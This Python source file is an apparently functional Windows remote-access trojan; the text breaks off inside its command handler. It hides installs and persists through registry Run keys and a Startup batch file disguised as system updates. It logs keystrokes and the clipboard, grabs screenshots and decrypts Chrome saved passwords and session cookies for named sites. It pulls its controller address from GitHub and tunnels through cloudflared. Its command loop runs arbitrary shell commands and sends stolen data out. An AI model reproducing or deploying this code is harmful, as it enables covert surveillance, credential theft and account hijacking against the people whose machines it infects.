import argparse
import base64
import ctypes
import getpass
import importlib
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
import winreg
from urllib.parse import urlparse

def install_dependencies():
    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
    for lib in required:
        try:
            __import__(lib if lib != 'pycryptodome' else 'Crypto')
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])

install_dependencies()

import websocket

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None
    REQUESTS_AVAILABLE = False

import pyautogui

# Optional dependencies
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    AES = None
    CRYPTO_AVAILABLE = False

try:
    from mss import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    pyautogui = None
    PYAUTOGUI_AVAILABLE = False

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    keyboard = None
    PYNPUT_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    pyperclip = None
    PYPERCLIP_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None
    PSUTIL_AVAILABLE = False

REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']

# Default command hub settings. These values can be overridden by
# environment variables KING_HUB_IP / KING_HUB_PORT or by passing
# --hub-ip / --hub-port on the command line.
HUB_ADDRESS = ''
HUB_PORT = 9999
DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt'

DRIVE_FIXED = 3
DRIVE_REMOVABLE = 2

keylog_active = False
keylog_data = ''
keylog_thread = None
clipboard_active = False
clipboard_thread = None
last_clipboard = ''


def silent_bootstrap():
    """Install required packages silently if missing."""
    for package in REQUIRED_PACKAGES:
        try:
            if package == 'pycryptodome':
                importlib.import_module('Crypto')
            elif package == 'Pillow':
                importlib.import_module('PIL')
            else:
                importlib.import_module(package)
        except ImportError:
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', package, '--quiet', '--no-warn-script-location'],
                    capture_output=True,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
            except Exception:
                pass


def get_hwid():
    """Return a hardware ID based on the MAC address."""
    return '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()


def get_arp_table():
    """Retrieve the Windows ARP table."""
    try:
        output = subprocess.check_output('arp -a', shell=True, stderr=subprocess.DEVNULL)
        return output.decode('utf-8', errors='ignore')
    except Exception as e:
        return f'Failed to get ARP table: {e}'


def send_atomic_data(s, type, data, filename, is_websocket=False):
    """Send data with the unified atomic sync protocol."""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        header = f"DATA_HEADER|{type}|{len(data)}|{filename}\n".encode('utf-8')
        if is_websocket:
            s.send_binary(header + data + b'V_PULSE_EOF')
        else:
            s.sendall(header + data + b'V_PULSE_EOF')
        return True
    except Exception as e:
        print(f'[-] Atomic send failed: {e}')
        return False


def run_detached():
    """Restart this process in detached mode."""
    if platform.system() != 'Windows':
        return
    cmd = [sys.executable, sys.argv[0]] + sys.argv[1:] + ['--detached']
    subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
    sys.exit(0)


# Keylogger

def start_keylogger():
    """Start the keylogger thread."""
    global keylog_active, keylog_data, keylog_thread
    if not PYNPUT_AVAILABLE:
        return 'pynput not available'
    if keylog_active:
        return 'Keylogger already active'

    keylog_active = True
    keylog_data = ''

    def on_press(key):
        global keylog_data
        try:
            keylog_data += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                keylog_data += ' '
            elif key == keyboard.Key.enter:
                keylog_data += '\n'
            elif key == keyboard.Key.tab:
                keylog_data += '\t'
            else:
                keylog_data += f'[{key}]'

    listener = keyboard.Listener(on_press=on_press)
    keylog_thread = threading.Thread(target=listener.start, daemon=True)
    keylog_thread.start()
    return 'Keylogger started'


def stop_keylogger():
    """Stop the keylogger."""
    global keylog_active, keylog_thread
    keylog_active = False
    if keylog_thread:
        keylog_thread.join(timeout=1.0)
    return 'Keylogger stopped'


def get_keylog_bytes():
    """Return keylogger contents as bytes."""
    return keylog_data.encode('utf-8', errors='ignore')


# Clipboard monitor

def start_clipboard_monitor():
    """Start monitoring the clipboard."""
    global clipboard_active, clipboard_thread, last_clipboard
    if not PYPERCLIP_AVAILABLE:
        return 'pyperclip not available'
    if clipboard_active:
        return 'Clipboard monitor already active'

    clipboard_active = True
    last_clipboard = pyperclip.paste() if pyperclip else ''

    def monitor_clipboard():
        global last_clipboard
        while clipboard_active:
            try:
                current = pyperclip.paste()
                if current != last_clipboard:
                    last_clipboard = current
                    print(f'[*] Clipboard changed: {current[:100]}')
            except Exception:
                pass
            time.sleep(1)

    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    return 'Clipboard monitor started'


def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global clipboard_active, clipboard_thread
    clipboard_active = False
    if clipboard_thread:
        clipboard_thread.join(timeout=1.0)
    return 'Clipboard monitor stopped'


# Screenshot

def capture_desktop_screenshot(client, is_websocket=False):
    """Capture the desktop and send it back."""
    if not MSS_AVAILABLE or not PIL_AVAILABLE:
        try:
            if is_websocket:
                client.send('DEPENDENCY_MISSING: mss Pillow')
            else:
                client.sendall(b'DEPENDENCY_MISSING: mss Pillow')
        except Exception:
            pass
        return

    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            new_width = int(image.width * 0.7)
            new_height = int(image.height * 0.7)
            image = image.resize((new_width, new_height), Image.Resampling.LANCZOS)
            import io
            buffer = io.BytesIO()
            image.save(buffer, format='JPEG', quality=60, optimize=True)
            jpg_data = buffer.getvalue()
            send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg', is_websocket=is_websocket)
    except Exception as e:
        try:
            if is_websocket:
                client.send(f'CAPTURE_FAILED: {e}')
            else:
                client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
        except Exception:
            pass


# Persistence

def ensure_service_continuity():
    """Ensure the agent is registered to run on startup."""
    try:
        app_data = os.getenv('APPDATA') or ''
        target_file = os.path.join(app_data, 'SystemUpdates', 'win_manager.py')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        expected_value = f'pythonw "{target_file}"'
        try:
            current_value, _ = winreg.QueryValueEx(key, 'WinManager')
            if current_value != expected_value:
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
        except FileNotFoundError:
            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
        winreg.CloseKey(key)
    except Exception:
        pass


def establish_persistence():
    """Copy this script to AppData and add persistence."""
    target_file = None
    try:
        app_data = os.getenv('APPDATA') or ''
        target_dir = os.path.join(app_data, 'SystemUpdates')
        os.makedirs(target_dir, exist_ok=True)
        target_file = os.path.join(target_dir, 'win_manager.py')
        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
            shutil.copy2(sys.argv[0], target_file)
        startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
        if not os.path.exists(bat_path):
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'@echo off\npythonw "{target_file}"')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
        winreg.CloseKey(key)
    except Exception:
        pass
    return target_file


def check_persistence(target_file):
    """Periodically verify persistence is still present."""
    while True:
        try:
            if not target_file:
                time.sleep(300)
                continue
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            value, _ = winreg.QueryValueEx(key, 'WinManager')
            winreg.CloseKey(key)
            expected = f'pythonw "{target_file}"'
            if value != expected:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected)
                winreg.CloseKey(key)
        except Exception:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
                winreg.CloseKey(key)
            except Exception:
                pass
        time.sleep(300)


# Exploration

def list_dirs(path, depth=0, max_depth=3):
    """List directories recursively up to max_depth."""
    result = []
    if depth >= max_depth:
        return result
    try:
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(full)
                result.extend(list_dirs(full, depth + 1, max_depth))
    except (PermissionError, OSError):
        pass
    return result


def explore_drives():
    """Discover fixed and removable drives."""
    kernel32 = ctypes.windll.kernel32
    get_drive_type = kernel32.GetDriveTypeW
    drives = {}
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        root = f'{letter}:\\'
        if os.path.exists(root):
            type_code = get_drive_type(root)
            if type_code == DRIVE_FIXED:
                type_str = 'system' if letter == 'C' else 'secondary'
            elif type_code == DRIVE_REMOVABLE:
                type_str = 'mobile'
            else:
                continue
            drives[letter] = {'type': type_str, 'dirs': list_dirs(root, max_depth=2)}
    return drives


def harvest_user():
    """Collect paths from user directories."""
    userprofile = os.getenv('USERPROFILE') or ''
    targets = ['Documents', 'Desktop', 'Downloads']
    result = {}
    for target in targets:
        path = os.path.join(userprofile, target)
        if os.path.exists(path):
            result[target] = []
            for root, _, files in os.walk(path):
                for filename in files:
                    result[target].append(os.path.join(root, filename))
    return result


# Utilities

def get_username():
    """Return the current username."""
    try:
        return os.getlogin()
    except OSError:
        return getpass.getuser()


def report_status():
    """Report system status."""
    report = {
        'HWID': get_hwid(),
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': get_username(),
        'Python': platform.python_version(),
    }
    if PSUTIL_AVAILABLE:
        try:
            report['Uptime'] = f'{time.time() - psutil.boot_time():.2f}s'
            report['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
            report['Memory'] = f'{psutil.virtual_memory().percent}%'
        except Exception:
            report['Uptime'] = 'N/A'
    else:
        report['Uptime'] = 'N/A'
    return json.dumps(report)


def decrypt_dpapi(encrypted_bytes):
    """Decrypt DPAPI-protected bytes."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.c_uint32), ('pbData', ctypes.POINTER(ctypes.c_char))]

    data_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    data_out = DATA_BLOB()

    ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
        ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(DATA_BLOB)
    ]

    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)):
        decrypted = ctypes.string_at(data_out.pbData, data_out.cbData)
        ctypes.windll.kernel32.LocalFree(data_out.pbData)
        return decrypted
    return None


def safe_copy(source, destination):
    """Attempt to copy a locked database file up to 3 times."""
    import time
    for i in range(3):
        try:
            # Use shutil.copy as a base, but wrap it in a retry
            import shutil
            shutil.copy2(source, destination)
            return True
        except PermissionError:
            # If locked, wait 1 second and try again
            time.sleep(1)
        except Exception:
            break
    return False


def extract_chrome_credentials():
    try:
        import ctypes, sqlite3, json, os, base64, shutil, glob
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            try:
                from Crypto.Cipher import AES
            except ImportError:
                return b"Error: pycryptodome library missing."

        try:
            user_data_path = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
            local_state_path = os.path.join(user_data_path, 'Local State')

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]

            # --- THE "NO FROM_PARAM" FIX ---
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]

            # Explicitly define all 7 arguments to prevent the 'item 2' error
            # We use c_void_p for the optional buffers
            ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
                ctypes.POINTER(DATA_BLOB), # pDataIn
                ctypes.c_void_p,           # pptrszDataDescr
                ctypes.c_void_p,           # pOptionalEntropy
                ctypes.c_void_p,           # pvReserved
                ctypes.c_void_p,           # pPromptStruct
                ctypes.c_uint32,           # dwFlags
                ctypes.POINTER(DATA_BLOB)  # pDataOut
            ]

            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
            blob_out = DATA_BLOB()

            # Call with actual null pointers (0) instead of Python 'None'
            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
                master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            else:
                return b"Error: DPAPI Decryption Failed."

            # --- TOTAL RECOVERY SWEEP ---
            output = []
            # We search EVERY folder in User Data for any file named 'Login Data'
            login_data_files = glob.glob(os.path.join(user_data_path, "**", "Login Data"), recursive=True)

            for login_data_path in login_data_files:
                # Use a unique temp name to avoid file locks
                temp_db = os.path.join(os.getenv('TEMP'), f"v_db_{os.urandom(2).hex()}.db")
                try:
                    # Use the safe_copy function instead of direct shutil.copy2
                    if safe_copy(login_data_path, temp_db):
                        try:
                            # 1. Connect using URI for Read-Only access
                            conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            
                            # 2. Fetch ALL data into memory IMMEDIATELY
                            # This prevents the "Closed Database" error because we don't need the DB anymore
                            all_rows = cursor.fetchall()
                            conn.close() 

                            # 3. Process the data from RAM, not from the file
                            for url, user, enc_pass in all_rows:
                                if not user and not enc_pass: continue
                                
                                password = " [No Password Saved] "
                                if enc_pass:
                                    try:
                                        # Try Modern Decryption
                                        if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
                                            nonce = enc_pass[3:15]
                                            payload = enc_pass[15:]
                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                            # Try to decrypt and verify the tag
                                            password = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                        else:
                                            # Try Legacy DPAPI
                                            blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
                                            blob_out = DATA_BLOB()
                                            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
                                                password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='ignore')
                                                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                                    except:
                                        password = "[Decryption Failed]"

                                profile_name = os.path.basename(os.path.dirname(login_data_path))
                                output.append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")

                        except Exception as e:
                            # If the DB itself is corrupted, catch it here
                            output.append(f"[!] Logic Error: {str(e)}")

                    # --- SESSION GHOST: COOKIE EXTRACTION ---
                    cookie_output = []
                    cookie_path = os.path.join(os.path.dirname(login_data_path), "Network", "Cookies")

                    if os.path.exists(cookie_path):
                        temp_c = os.path.join(os.getenv('TEMP'), f"c_task_{os.urandom(2).hex()}.db")
                        try:
                            if safe_copy(cookie_path, temp_c):
                                try:
                                    c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
                                    c_cursor = c_conn.cursor()
                                
                                    # We target high-value session cookies
                                    c_cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
                                    
                                    # Fetch all into memory
                                    all_cookie_rows = c_cursor.fetchall()
                                    c_conn.close()
                                    
                                    # Process from RAM
                                    for host, name, enc_val, path, expires in all_cookie_rows:
                                        if not enc_val.startswith(b'v10'): continue
                                        
                                        try:
                                            # Same AES-GCM Surgical Slice
                                            nonce = enc_val[3:15]
                                            payload = enc_val[15:]
                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                            cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                            
                                            if cookie_val:
                                                cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
                                        except:
                                            continue
                                except Exception as e:
                                    # Handle cookie DB errors
                                    pass
                        finally:
                            if os.path.exists(temp_c): os.remove(temp_c)

                    if cookie_output:
                        output.append("\n--- SESSION COOKIES ---\n" + "\n".join(cookie_output))
                finally:
                    if os.path.exists(temp_db): os.remove(temp_db)

            # --- THE SESSION CLONING LOGIC ---
            cloning_output = []
            cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')

            if os.path.exists(cookie_path):
                temp_c = os.path.join(os.getenv('TEMP'), f"c_shadow_{os.urandom(2).hex()}.db")
                try:
                    if safe_copy(cookie_path, temp_c):
                        try:
                            c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
                            c_cursor = c_conn.cursor()
                            # We only need the Session Cookies for high-value targets
                            c_cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%novo.co%' OR host_key LIKE '%gmail.com%'")
                            
                            all_cookies = c_cursor.fetchall()
                            c_conn.close()
                            
                            for host, name, enc_val in all_cookies:
                                if not enc_val.startswith(b'v10'): continue
                                
                                try:
                                    # Decrypt using your existing AES-GCM logic
                                    nonce = enc_val[3:15]
                                    payload = enc_val[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                    decrypted_cookie = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                    
                                    if decrypted_cookie:
                                        cloning_output.append(f"COOKIE | Host: {host} | Name: {name} | Value: {decrypted_cookie}")
                                except:
                                    continue
                        except Exception as e:
                            cloning_output.append(f"Cookie Error: {str(e)}")
                finally:
                    if os.path.exists(temp_c): os.remove(temp_c)

            if cloning_output:
                output.append("\n--- SESSION CLONING ---\n" + "\n".join(cloning_output))

            # --- TARGETING THE SESSION GHOST ---
            ghost_output = []
            cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 5', 'Network', 'Cookies')

            if os.path.exists(cookie_path):
                temp_c = os.path.join(os.getenv('TEMP'), f"c_vault_{os.urandom(2).hex()}.db")
                try:
                    if safe_copy(cookie_path, temp_c):
                        try:
                            c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
                            c_cursor = c_conn.cursor()
                            # Pulling session tokens for the targets in your list
                            c_cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%un.org.pk%'")
                            
                            all_ghost_cookies = c_cursor.fetchall()
                            c_conn.close()
                            
                            for host, name, enc_val in all_ghost_cookies:
                                if not enc_val.startswith(b'v10'): continue
                                
                                try:
                                    # Use the SAME decryption logic you have for passwords
                                    nonce = enc_val[3:15]
                                    payload = enc_val[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                    cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                    
                                    if cookie_val:
                                        ghost_output.append(f"SESSION_TOKEN | Host: {host} | Name: {name} | Value: {cookie_val}")
                                except:
                                    continue
                        except Exception as e:
                            ghost_output.append(f"Session Ghost Error: {str(e)}")
                finally:
                    if os.path.exists(temp_c): os.remove(temp_c)

            if ghost_output:
                output.append("\n--- SESSION GHOST ---\n" + "\n".join(ghost_output))

            # If the output is still empty, it means the 'logins' table is physically empty
            if not output:
                return b"System Check: DB found but the 'logins' table contains 0 entries."
                
            return "\n".join(output).encode('utf-8', errors='replace')
        except Exception as e:
            return f"Final Logic Error: {str(e)}".encode()
    except Exception as e:
        return f"Final Logic Error: {str(e)}".encode()


def extract_file_bytes(path):
    """Read a file and return bytes for exfiltration."""
    if not os.path.isfile(path):
        return None
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception:
        return None


def _is_ip_address(host: str) -> bool:
    """Return True if the host string is a valid IPv4 or IPv6 address."""
    if not host:
        return False
    try:
        socket.inet_pton(socket.AF_INET, host)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return True
    except OSError:
        pass
    return False


def _is_cloudflare_quick_tunnel(host: str) -> bool:
    """Detect whether the host is a Cloudflare quick tunnel hostname."""
    host = host.lower().rstrip('.')
    return host.endswith('.trycloudflare.com') or host.endswith('.cfargotunnel.com')


def _parse_king_destination(raw_value: str):
    """Normalize a throne destination string into host and optional port."""
    if not raw_value:
        return None, None

    destination = raw_value.strip().splitlines()[0].strip()
    for prefix in ('http://', 'https://', 'tcp://', 'ssh://'):
        if destination.startswith(prefix):
            destination = destination[len(prefix):]
            break
    destination = destination.rstrip('/')
    if not destination:
        return None, None

    if '://' not in destination:
        destination = '//' + destination

    parsed = urlparse(destination)
    return parsed.hostname, parsed.port


def connect_to_king(king_url):
    while True:
        try:
            # A: KILL GHOSTS - Ensure no old tunnels are clogging RAM
            os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
            
            # B: GET THE ADDRESS - Bypass GitHub cache to get the NEW city link
            # Adding a timestamp (?v=...) is the 'Final Nail' for stale links
            throne_url = f"https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt?v={time.time()}"
            king_link = requests.get(throne_url).text.strip()
            
            # C: START THE BRIDGE - This turns the assistant laptop into a receiver
            # We use a unique listener port (e.g., 7878)
            bridge = subprocess.Popen(
                ["cloudflared.exe", "access", "tcp", "--hostname", king_link, "--listener", "127.0.0.1:7878"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            # D: THE HANDSHAKE - Wait for the Sindh network to stabilize
            time.sleep(8)
            
            # E: THE SOCKET - Connect to the LOCAL bridge
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect(("127.0.0.1", 7878))
            
            print("[+] Connection Established with King!")
            return s # Success!
            
        except Exception as e:
            print(f"[-] King not found. Retrying in 10 seconds...")
            time.sleep(10) # Prevent the 'Terminal Explosion'


def connect_direct_hub(hub_ip, port, max_retries: int = 3):
    """Connect directly to the command hub using WebSocket."""
    print(f"[DEBUG] connect_direct_hub called with {hub_ip}:{port}")
    ws_url = f"ws://{hub_ip}:{port}"
    for attempt in range(max_retries):
        try:
            ws = websocket.create_connection(ws_url, timeout=10)
            print(f"[+] Direct WebSocket connection established to hub at {hub_ip}:{port}")
            return ws
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            print(f"[-] Direct WebSocket connection failed after {max_retries} attempts: {e}")
            return None


def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
    """Connect to the hub and process commands."""
    while True:
        try:
            use_throne = (
                github_throne_url and
                (not hub_ip or hub_ip.lower() == 'serveo.net')
            )

            if use_throne:
                king_url = get_king_url(github_throne_url)
                if king_url:
                    client = connect_to_king(king_url)
                else:
                    client = None
            else:
                client = connect_direct_hub(hub_ip, port)

            if not client:
                delay = random.randint(5, 15)
                print(f'[*] Retrying in {delay} seconds...')
                time.sleep(delay)
                continue
            
            while True:
                try:
                    if isinstance(client, socket.socket):
                        data = client.recv(1024)
                    else:
                        data = client.recv()

                    if isinstance(data, bytes):
                        data = data.decode('utf-8', errors='ignore')
                    print(f"[DEBUG] Drone received: {repr(data)}")
                except websocket.WebSocketTimeoutException:
                    continue
                except websocket.WebSocketConnectionClosedException:
                    print('[-] Connection reset by hub.')
                    break
                except Exception as e:
                    print(f'[-] WebSocket error: {e}')
                    break

                if not data:
                    print('[-] Hub closed the connection.')
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command:
                        continue

                    elif command == 'STATUS_REPORT':
                        client.send(f'STATUS:{report_status()}')
                    elif command == 'DESKTOP_CAPTURE':
                        capture_desktop_screenshot(client, is_websocket=True)
                    elif command == 'SCREENSHOT':
                        try:
                            from mss import mss
                            with mss() as sct:
                                # Capture and save locally first
                                temp_img = os.path.join(os.getenv('TEMP'), "v_shot.png")
                                sct.shot(output=temp_img)

                            with open(temp_img, "rb") as f:
                                img_data = f.read()

                            # Send THE HEADER: Type|Size|Name
                            header = f"DATA_HEADER|SCREENSHOT|{len(img_data)}|snap_{int(time.time())}.png\n"
                            client.send(header.encode() + img_data + b"V_PULSE_EOF")

                            # Clean up
                            os.remove(temp_img)
                        except Exception as e:
                            client.send(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
                    elif command == 'ENSURE_SERVICE_CONTINUITY':
                        ensure_service_continuity()
                        client.send(b'SERVICE_CONTINUITY_OK\n')
                        client.send(b'V_PULSE_EOF\n')
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received.')
                        return
                    elif command == 'PING':
                        client.send(b'PING_OK\n')
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('MESSAGE '):
                        # Syntax: MESSAGE "text"
                        try:
                            msg_text = command.split('"')[1]
                            import ctypes
                            ctypes.windll.user32.MessageBoxW(0, msg_text, 'System Update', 64)
                        except:
                            pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('SHELL '):
                        # Syntax: SHELL "cmd"
                        try:
                            cmd_text = command.split('"')[1]
                            import subprocess
                            subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        except:
                            pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('GHOST_OPEN|') or command.startswith('open '):
                        try:
                            if command.startswith('GHOST_OPEN|'):
                                target_url = command.split('|', 1)[1]
                            else:
                                target_url = command.split(' ', 1)[1]
                            import webbrowser
                            webbrowser.open(target_url)
                        except:
                            pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command == 'GHOST_MOVE':
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                        else:
                            try:
                                pyautogui.moveRel(10, 0, duration=0.1)
                                pyautogui.moveRel(-10, 0, duration=0.1)
                            except Exception:
                                pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('GHOST_TYPE|'):
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                        else:
                            try:
                                text = command.split('|', 1)[1]
                                pyautogui.typewrite(text)
                            except Exception:
                                pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command == 'KILL_AGENT':
                        try:
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                            winreg.DeleteValue(key, 'WinManager')
                            winreg.CloseKey(key)
                        except Exception:
                            pass
                        try:
                            startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                            bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
                            if os.path.exists(bat_path):
                                os.remove(bat_path)
                        except Exception:
                            pass
                        try:
                            target_file = os.path.join(os.getenv('APPDATA') or '', 'SystemUpdates', 'win_manager.py')
                            if os.path.exists(target_file):
                                os.remove(target_file)
                        except Exception:
                            pass
                        return
                    elif command == 'EXPLORE_DRIVES':
                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=True)
                    elif command == 'HARVEST_USER':
                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=True)
                    elif command == 'NETWORK_TOPOLOGY':
                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=True)
                    elif command == 'EXTRACT_CREDENTIALS':
                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=True)
                    elif command == 'GET_KEYS':
                        if not PYNPUT_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pynput\n')
                        else:
                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=True)
                    elif command.startswith('EXTRACT_FILE '):
